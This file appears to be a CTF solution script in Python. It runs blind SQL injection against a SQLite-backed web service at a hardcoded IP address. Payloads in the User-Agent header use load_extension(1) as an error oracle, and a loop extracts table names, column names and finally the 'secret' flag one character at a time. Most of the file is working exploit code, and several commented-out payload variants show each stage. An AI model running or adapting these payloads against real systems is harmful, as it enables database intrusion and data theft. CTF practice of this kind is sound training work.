import requests
import string
alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#_*&@!^*()%$+',/{}[]:<>"
url = "http://54.151.202.193:30980"
payload = ""

for i in range(1, 100):
    for char in alphabet:

         # bước 1
         
        # headers = {
        #     'User-Agent': f"a',null,null,null,null), (null,'aaa"
        # }
         # bước 2
         
        # headers = {
        #     'User-Agent': f"a',null,null,null,CASE WHEN 1 = 0 THEN NULL ELSE load_extension(1) END), (null,'aaa"
        # }

         # extract table name
         
        # headers = {
        #      'User-Agent': f"a',null,null,null,CASE WHEN (SELECT SUBSTRING(tbl_name,1,{i}) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' AND tbl_name != 'logger') = '{payload + char}' THEN NULL ELSE load_extension(1) END), (null,'aaa"
        #  }

         # extract clumn name
        # headers = {
        #     'User-Agent': f"a',null,null,null,CASE WHEN (SELECT SUBSTRING(name,1,{i}) FROM PRAGMA_TABLE_INFO('flag') LIMIT 1,1) = '{payload + char}' THEN NULL ELSE load_extension(1) END), (null,'aaa"
        # }

         # extract FLAGGGGGGGGGGGGGGGG
         
        headers = {
            'User-Agent': f"a',null,null,null,CASE WHEN (SELECT SUBSTRING(secret,1,{i}) FROM flag LIMIT 1) = '{payload + char}' THEN NULL ELSE load_extension(1) END), (null,'aaa"
        }



         # test
        # headers = {
        #     'User-Agent': f"a',null,null,null,CASE WHEN (SELECT SUBSTRING(sql,1,{i}) FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name = 'logger') = '{payload + char}' THEN NULL ELSE load_extension(1) END), (null,'aaa"
        # }

        response = requests.get(url=url, headers=headers)
        print(response.text)
        print(i)
        print(char)
        if ("Logged" in response.text):
            payload += char
            print("table_name is: " + payload)
            break

# table_name is: flag
# column_name is: secret
# SELECT name FROM PRAGMA_TABLE_INFO('flag') WHERE type='table'


        # headers = {
        #     'User-Agent': f"a',null,null,null,CASE WHEN (SELECT SUBSTRING(CREATE,1,{i}) FROM flag LIMIT 1) = '{payload + char}' THEN NULL ELSE load_extension(1) END), (null,'aaa"
        # }
# headers = {
#      'User-Agent': "a',null,null,null,CASE WHEN EXIST(SELECT SUBSTRING(tbl_name,1,1) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' AND tbl_name != 'logger') = '?' THEN NULL ELSE load_extension(1) END), (null,'aaa"
#  }
# headers = {
#     'User-Agent': "a',null,null,null,CASE WHEN EXISTS(SELECT Stbl_name FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' AND tbl_name != 'logger') THEN NULL ELSE load_extension(1) END), (null,'aaa"
# }

# headers = {
#             'User-Agent': f"a',null,null,null,CASE WHEN (SELECT SUBSTRING(name,1,{i}) FROM pragma_table_info('flag') WHERE  tbl_name = 'flag' LIMIT 1) = '{payload + char}' THEN NULL ELSE load_extension(1) END), (null,'aaa"
#         }


# headers = {
#     'User-Agent': "a',null,null,null,CASE WHEN EXIST(SELECT SUBSTRING(tbl_name,1,1) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' AND tbl_name != 'logger') = 'a' THEN NULL ELSE load_extension(1) END), (null,'aaa"
# }